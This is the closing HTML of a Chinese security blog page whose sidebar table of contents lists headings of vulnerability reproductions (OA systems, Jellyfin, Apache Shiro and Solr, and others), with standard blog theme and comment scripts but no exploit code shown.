href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/hw.html"><img class="next-cover" src="/image/3.jpg" onerror="onerror=null;src='/img/404.png'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2020HW漏洞</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/TX.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="avatar"/><div class="author-info__name">Harbor</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" href="JavaScript:AddFavorite('https://harbors.vip','harbor')"><i class="fa fa-bookmark"></i><span>加入书签</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:harbor104909@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/sitemap.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">随风前行！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#360%E5%A4%A9%E6%93%8E-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">360天擎-前台sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">1.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞详情</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Jellyfin%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2021-21402"><span class="toc-number">2.</span> <span class="toc-text">Jellyfin未授权任意文件读取 - CVE-2021-21402</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8A%AB%E9%9C%B2%E6%97%B6%E9%97%B4%E7%BA%BF"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞披露时间线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81"><span class="toc-number">2.2.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E4%BA%A7%E5%93%81"><span class="toc-number">2.3.</span> <span class="toc-text">影响产品</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%89%88%E6%9C%AC"><span class="toc-number">2.4.</span> <span class="toc-text">测试版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%86%E8%8A%82"><span class="toc-number">2.5.</span> <span class="toc-text">细节</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-1-Audio-itemId-hls-segmentId-stream-mp3%E5%92%8C-Audio-itemId-hls-segmentId-stream-aac%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.5.1.</span> <span class="toc-text">问题 1:  &#x2F;Audio&#x2F;itemId&#x2F;hls&#x2F;segmentId&#x2F;stream.mp3和 &#x2F;Audio&#x2F;itemId&#x2F;hls&#x2F;segmentId&#x2F;stream.aac未授权任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">影响</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-2-Videos-Id-hls-PlaylistId-SegmentId-SegmentContainer%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.5.2.</span> <span class="toc-text">问题 2:  &#x2F;Videos&#x2F;Id&#x2F;hls&#x2F;PlaylistId&#x2F;SegmentId.SegmentContainer未授权任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D-1"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">影响</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-3-Videos-Id-hls-PlaylistId-stream-m3u8%E5%B7%B2%E6%8E%88%E6%9D%83%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.5.3.</span> <span class="toc-text">问题 3: &#x2F;Videos&#x2F;Id&#x2F;hls&#x2F;PlaylistId&#x2F;stream.m3u8已授权的任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D-2"><span class="toc-number">2.5.3.1.</span> <span class="toc-text">影响</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-4-Images-Ratings-theme-name-Images-MediaInfo-theme-name-%E5%92%8C-Images-General-name-type%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%9B%BE%E5%83%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.5.4.</span> <span class="toc-text">问题 4: &#x2F;Images&#x2F;Ratings&#x2F;theme&#x2F;name, &#x2F;Images&#x2F;MediaInfo&#x2F;theme&#x2F;name 和 Images&#x2F;General&#x2F;name&#x2F;type未授权任意图像文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D-3"><span class="toc-number">2.5.4.1.</span> <span class="toc-text">影响</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-5-Videos-itemId-Subtitles%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E4%B8%8D%E9%99%90%E4%BA%8EWindows%EF%BC%89"><span class="toc-number">2.5.5.</span> <span class="toc-text">问题 5: &#x2F;Videos&#x2F;itemId&#x2F;Subtitles经身份验证的文件上传（不限于Windows）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D-4"><span class="toc-number">2.5.5.1.</span> <span class="toc-text">影响</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE"><span class="toc-number">2.6.</span> <span class="toc-text">CVE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%86%E8%BD%AF-V9getshell-FineReport-V9"><span class="toc-number">3.</span> <span class="toc-text">帆软 V9getshell FineReport V9</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEOA8%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">泛微OA8前台SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEOA9%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">5.</span> <span class="toc-text">泛微OA9前台任意文件上传</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">6.</span> <span class="toc-text">和信创天云桌面命令执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%B4%E8%BF%9COA-ajax-do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">致远OA ajax.do 任意文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%A6%96%E5%85%88%E6%B5%8B%E8%AF%95%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-number">7.0.1.</span> <span class="toc-text">一、首先测试漏洞环境是否存在</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%B4%E8%BF%9COA-%E5%89%8D%E5%8F%B0getshell-%E5%A4%8D%E7%8E%B0"><span class="toc-number">8.</span> <span class="toc-text">致远OA 前台getshell 复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%B4%E8%BF%9COA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">9.</span> <span class="toc-text">致远OA任意文件上传</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#apache-Solr-%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">10.</span> <span class="toc-text">apache Solr 存在任意文件读取</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DzzOffice%E6%9C%80%E6%96%B0%E7%89%88RCE-%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98"><span class="toc-number">11.</span> <span class="toc-text">DzzOffice最新版RCE(随机数问题)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A6%85%E9%81%93-11-6-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.</span> <span class="toc-text">禅道 11.6 sql注入漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%93%9D%E5%87%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">13.</span> <span class="toc-text">蓝凌oa任意文件写入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E5%8F%8BNC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">14.</span> <span class="toc-text">用友NC反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEe-mobile-0day"><span class="toc-number">15.</span> <span class="toc-text">泛微e-mobile 0day</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mp-test-com-89-%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5getshell"><span class="toc-number">15.1.</span> <span class="toc-text">mp.test.com:89 系统SQL注入getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%EF%BC%9ASQL%E6%B3%A8%E5%85%A5"><span class="toc-number">15.1.1.</span> <span class="toc-text">漏洞类型：SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AD%89%E7%BA%A7%EF%BC%9A%E4%B8%A5%E9%87%8D"><span class="toc-number">15.1.2.</span> <span class="toc-text">漏洞等级：严重</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9EURL%EF%BC%9A"><span class="toc-number">15.1.3.</span> <span class="toc-text">漏洞URL： </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">15.1.4.</span> <span class="toc-text">漏洞描述: </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%EF%BC%9A"><span class="toc-number">15.1.5.</span> <span class="toc-text">漏洞详细：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%B3%E5%8F%B0%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="toc-number">15.1.6.</span> <span class="toc-text">平台方案：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-Shiro-%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-17523%EF%BC%89"><span class="toc-number">16.</span> <span class="toc-text">Apache Shiro 两种姿势绕过认证分析（CVE-2020-17523）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">16.1.</span> <span class="toc-text">0x01 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">16.2.</span> <span class="toc-text">0x02 漏洞环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-poc%E6%B5%8B%E8%AF%95"><span class="toc-number">16.3.</span> <span class="toc-text">0x03 poc测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">16.4.</span> <span class="toc-text">0x04 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="toc-number">16.4.1.</span> <span class="toc-text">4.1 空格绕过分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="toc-number">16.4.2.</span> <span class="toc-text">4.2 &#x2F;.&#x2F;绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%AE%98%E6%96%B9%E7%9A%84%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">16.5.</span> <span class="toc-text">0x05 官方的修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%85%B3%E4%BA%8Etrim"><span class="toc-number">16.6.</span> <span class="toc-text">0x06 关于trim</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E5%8F%82%E8%80%83"><span class="toc-number">16.7.</span> <span class="toc-text">0x07 参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%AA%E6%BD%AE-ClusterEngineV4-0-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">17.</span> <span class="toc-text">浪潮 ClusterEngineV4.0 任意命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%85%B3%E6%B3%A8%E7%82%B9%EF%BC%9A"><span class="toc-number">17.1.</span> <span class="toc-text">漏洞关注点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-number">17.2.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">17.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fofa-dork"><span class="toc-number">17.4.</span> <span class="toc-text">fofa_dork</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">17.5.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81POC"><span class="toc-number">17.6.</span> <span class="toc-text">验证POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">17.7.</span> <span class="toc-text">修复方案</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/67da50f7.html" title="2021HW漏洞"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.png'" alt="2021HW漏洞"/></a><div class="content"><a class="title" href="/post/67da50f7.html" title="2021HW漏洞">2021HW漏洞</a><time datetime="2021-04-25T08:41:00.000Z" title="发表于 2021-04-25 16:41:00">2021-04-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/hw.html" title="2020HW漏洞"><img src="/image/3.jpg" onerror="this.onerror=null;this.src='/img/404.png'" alt="2020HW漏洞"/></a><div class="content"><a class="title" href="/post/hw.html" title="2020HW漏洞">2020HW漏洞</a><time datetime="2020-11-16T01:19:00.000Z" title="发表于 2020-11-16 09:19:00">2020-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/webldxf.html" title="常见漏洞描述及修复建议"><img src="/image/1.jpg" onerror="this.onerror=null;this.src='/img/404.png'" alt="常见漏洞描述及修复建议"/></a><div class="content"><a class="title" href="/post/webldxf.html" title="常见漏洞描述及修复建议">常见漏洞描述及修复建议</a><time datetime="2020-10-31T09:22:00.000Z" title="发表于 2020-10-31 17:22:00">2020-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/cve-2020-0796.html" title="CVE-2020-0796“永恒之黑”漏洞复现"><img src="/image/2.jpg" onerror="this.onerror=null;this.src='/img/404.png'" alt="CVE-2020-0796“永恒之黑”漏洞复现"/></a><div class="content"><a class="title" href="/post/cve-2020-0796.html" title="CVE-2020-0796“永恒之黑”漏洞复现">CVE-2020-0796“永恒之黑”漏洞复现</a><time datetime="2020-10-31T07:54:00.000Z" title="发表于 2020-10-31 15:54:00">2020-10-31</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Harbor</div><div class="footer_custom_text"><p> <a target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a>&nbsp; <a target="_blank" href="https://demo.jerryc.me/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a>&nbsp; <a target="_blank" href="https://GitHub.com/ "><img src="https://img.shields.io/badge/Hosted-Github-brightgreen?style=flat&logo=GitHub" title="本站线路托管于Github"></a>&nbsp; <a target="_blank" href="https://github.com/features/actions"><img src="https://img.shields.io/badge/Deploy-Github%20Actoion-d021d6?style=flat&logo=data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+R2l0SHViIEFjdGlvbnMgaWNvbjwvdGl0bGU+PHBhdGggZD0iTTEwLjk4NCAxMy44MzZhLjUuNSAwIDAgMS0uMzUzLS4xNDZsLS43NDUtLjc0M2EuNS41IDAgMSAxIC43MDYtLjcwOGwuMzkyLjM5MSAxLjE4MS0xLjE4YS41LjUgMCAwIDEgLjcwOC43MDdsLTEuNTM1IDEuNTMzYS41MDQuNTA0IDAgMCAxLS4zNTQuMTQ2em05LjM1My0uMTQ3bDEuNTM0LTEuNTMyYS41LjUgMCAwIDAtLjcwNy0uNzA3bC0xLjE4MSAxLjE4LS4zOTItLjM5MWEuNS41IDAgMSAwLS43MDYuNzA4bC43NDYuNzQzYS40OTcuNDk3IDAgMCAwIC43MDYtLjAwMXpNNC41MjcgNy40NTJsMi41NTctMS41ODVBMSAxIDAgMCAwIDcuMDkgNC4xN0w0LjUzMyAyLjU2QTEgMSAwIDAgMCAzIDMuNDA2djMuMTk2YTEuMDAxIDEuMDAxIDAgMCAwIDEuNTI3Ljg1em0yLjAzLTIuNDM2TDQgNi42MDJWMy40MDZsMi41NTcgMS42MXpNMjQgMTIuNWMwIDEuOTMtMS41NyAzLjUtMy41IDMuNWEzLjUwMyAzLjUwMyAwIDAgMS0zLjQ2LTNoLTIuMDhhMy41MDMgMy41MDMgMCAwIDEtMy40NiAzIDMuNTAyIDMuNTAyIDAgMCAxLTMuNDYtM2gtLjU1OGMtLjk3MiAwLTEuODUtLjM5OS0yLjQ4Mi0xLjA0MlYxN2MwIDEuNjU0IDEuMzQ2IDMgMyAzaC4wNGMuMjQ0LTEuNjkzIDEuNy0zIDMuNDYtMyAxLjkzIDAgMy41IDEuNTcgMy41IDMuNVMxMy40MyAyNCAxMS41IDI0YTMuNTAyIDMuNTAyIDAgMCAxLTMuNDYtM0g4Yy0yLjIwNiAwLTQtMS43OTQtNC00VjkuODk5QTUuMDA4IDUuMDA4IDAgMCAxIDAgNWMwLTIuNzU3IDIuMjQzLTUgNS01czUgMi4yNDMgNSA1YTUuMDA1IDUuMDA1IDAgMCAxLTQuOTUyIDQuOTk4QTIuNDgyIDIuNDgyIDAgMCAwIDcuNDgyIDEyaC41NThjLjI0NC0xLjY5MyAxLjctMyAzLjQ2LTNhMy41MDIgMy41MDIgMCAwIDEgMy40NiAzaDIuMDhhMy41MDMgMy41MDMgMCAwIDEgMy40Ni0zYzEuOTMgMCAzLjUgMS41NyAzLjUgMy41em0tMTUgOGMwIDEuMzc4IDEuMTIyIDIuNSAyLjUgMi41czIuNS0xLjEyMiAyLjUtMi41LTEuMTIyLTIuNS0yLjUtMi41UzkgMTkuMTIyIDkgMjAuNXpNNSA5YzIuMjA2IDAgNC0xLjc5NCA0LTRTNy4yMDYgMSA1IDEgMSAyLjc5NCAxIDVzMS43OTQgNCA0IDR6bTkgMy41YzAtMS4zNzgtMS4xMjItMi41LTIuNS0yLjVTOSAxMS4xMjIgOSAxMi41czEuMTIyIDIuNSAyLjUgMi41IDIuNS0xLjEyMiAyLjUtMi41em05IDBjMC0xLjM3OC0xLjEyMi0yLjUtMi41LTIuNVMxOCAxMS4xMjIgMTggMTIuNXMxLjEyMiAyLjUgMi41IDIuNSAyLjUtMS4xMjIgMi41LTIuNXptLTEzIDhhLjUuNSAwIDEgMCAxIDAgLjUuNSAwIDAgMC0xIDB6bTIgMGEuNS41IDAgMSAwIDEgMCAuNS41IDAgMCAwLTEgMHptMTIgMGMwIDEuOTMtMS41NyAzLjUtMy41IDMuNWEzLjUwMyAzLjUwMyAwIDAgMS0zLjQ2LTMuMDAyYy0uMDA3LjAwMS0uMDEzLjAwNS0uMDIxLjAwNWwtLjUwNi4wMTdoLS4wMTdhLjUuNSAwIDAgMS0uMDE2LS45OTlsLjUwNi0uMDE3Yy4wMTgtLjAwMi4wMzUuMDA2LjA1Mi4wMDdBMy41MDMgMy41MDMgMCAwIDEgMjAuNSAxN2MxLjkzIDAgMy41IDEuNTcgMy41IDMuNXptLTEgMGMwLTEuMzc4LTEuMTIyLTIuNS0yLjUtMi41UzE4IDE5LjEyMiAxOCAyMC41czEuMTIyIDIuNSAyLjUgMi41IDIuNS0xLjEyMiAyLjUtMi41eiIvPjwvc3ZnPg==" title="本站项目由Gtihub Action持续部署"></a>&nbsp; <a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a> </p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    let initData = {
      el: '#vcomment',
      appId: 'pbbig5DBYwrMCMMIuHyh9E8q-9Nh9j0Va',
      appKey: 'mQb6umUtVtC6fvNAKrcRoB4j',
      placeholder: '记得留言哦!',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
    }

    if (true) { 
      initData.requiredFields= ('nick'.split(','))
    }
    
    if (false) {
      const otherData = false
      initData = Object.assign({}, initData, otherData)
    }
    
    const valine = new Valine(initData)
  }

  if (typeof Valine === 'function') initValine() 
  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.querySelector('#vcomment'),loadValine)
  else setTimeout(() => loadValine(), 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script>function AddFavorite(sURL, sTitle){try{window.external.addFavorite(sURL, sTitle);}catch (e){try{window.sidebar.addPanel(sTitle, sURL, "");}catch (e){alert("请按住ctrl+D，将本博客加入收藏夹");}}}</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" async="async" mobile="false"></script><script>(function(){
  const bp = document.createElement('script');
  const curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https'){
  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else{
  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  bp.dataset.pjax = ''
  const s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})()</script></div></body></html>